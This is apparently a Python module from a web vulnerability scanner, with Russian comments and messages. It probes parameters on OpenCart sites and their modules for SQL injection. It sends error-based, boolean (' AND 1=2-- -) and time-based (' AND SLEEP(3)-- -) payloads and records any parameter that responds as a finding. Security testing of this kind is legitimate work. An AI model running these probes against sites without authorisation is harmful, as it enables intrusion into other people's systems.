# -*- coding: utf-8 -*-
"""Проверка параметров на SQLi. Порядок: ошибка, булева пара, время (3 повтора)."""
import statistics
import time
import urllib.parse

from core import findings, http, ui
from modules import mods, profiles

ERR = ("sql syntax", "you have an error in your sql", "warning: mysqli",
       "mysql_fetch", "check the manual that corresponds")
SLEEP = 3
ROUNDS = 3


def _url(route, param, value):
    base, _, qs = route.partition("?")
    parts = []
    for pair in qs.split("&"):
        if not pair:
            continue
        k, _, v = pair.partition("=")
        parts.append("%s=%s" % (k, urllib.parse.quote(value) if k == param else v))
    return base + "?" + "&".join(parts)


def _get(host, url):
    t0 = time.time()
    r = http.get(host, url, referer="https://" + host + "/")
    return r, time.time() - t0


def _safe(host, url):
    try:
        return _get(host, url)
    except Exception:
        return None, 0.0


def _err(r):
    low = r.text.lower()
    for m in ERR:
        if m in low:
            return m
    return ""


def _timed(host, url, rounds=ROUNDS):
    """Медиана времени по нескольким повторам."""
    ds = []
    for _ in range(rounds):
        r, dt = _safe(host, url)
        if r is None:
            return 0.0
        ds.append(dt)
        time.sleep(0.2)
    return statistics.median(ds)


def run(host, kind="opencart"):
    out = []
    routes = list((profiles.get(kind) or {}).get("params") or [])
    if kind == "opencart":
        try:
            routes += mods.routes(mods.list_mods(host))
        except Exception:
            pass
    if not routes:
        ui.say("параметров для проверки нет")
        return out

    for route, param, base in routes:
        ref, _ = _safe(host, _url(route, param, base))
        if ref is None:
            ui.say("%-28s нет ответа" % param)
            continue
        ref_len = len(ref.content)
        url_base = _url(route, param, base)

        q, _ = _safe(host, _url(route, param, base + "'"))
        if q is None:
            ui.say("%-28s сбой" % param)
            continue

        if q.status_code == 403 and ref.status_code == 200:
            ui.say("%-28s кавычка закрыта (403)" % param)
            continue

        err = _err(q)
        if err:
            ui.ok("%-28s ОШИБКА SQL" % param)
            out.append(findings.make(host, _url(route, param, base + "'"), "sqli-error",
                                     q.status_code, len(q.content), ref_len, q.text,
                                     base + "'", err))
            continue

        a, _ = _safe(host, _url(route, param, base + "' AND 1=1-- -"))
        b, _ = _safe(host, _url(route, param, base + "' AND 1=2-- -"))
        if a is not None and b is not None:
            la, lb = len(a.content), len(b.content)
            if abs(la - lb) > max(300, la // 20):
                ui.ok("%-28s БУЛЕВА: %d против %d" % (param, la, lb))
                out.append(findings.make(host, _url(route, param, base + "' AND 1=2-- -"),
                                         "sqli-bool", b.status_code, lb, la, b.text,
                                         base + "' AND 1=2-- -"))
                time.sleep(0.3)
                continue

        dt = _timed(host, _url(route, param, base + "' AND SLEEP(%d)-- -" % SLEEP))
        if dt >= SLEEP * 0.7:
            ui.ok("%-28s ВРЕМЕННАЯ: медиана %.1f c" % (param, dt))
            out.append(findings.make(host, _url(route, param, base + "' AND SLEEP(%d)-- -" % SLEEP),
                                     "sqli-time", 0, 0, ref_len, "",
                                     base + "' AND SLEEP(%d)-- -" % SLEEP, "%.1f c" % dt))
        else:
            ui.say("%-28s чисто (медиана %.1f c)" % (param, dt))
        time.sleep(0.3)

    print()
    if out:
        ui.ok("подозрительные параметры: %d" % len(out))
        for f in out:
            ui.say("  %s %s" % (f["tag"], f["url"]))
    else:
        ui.say("чисто")
    return out
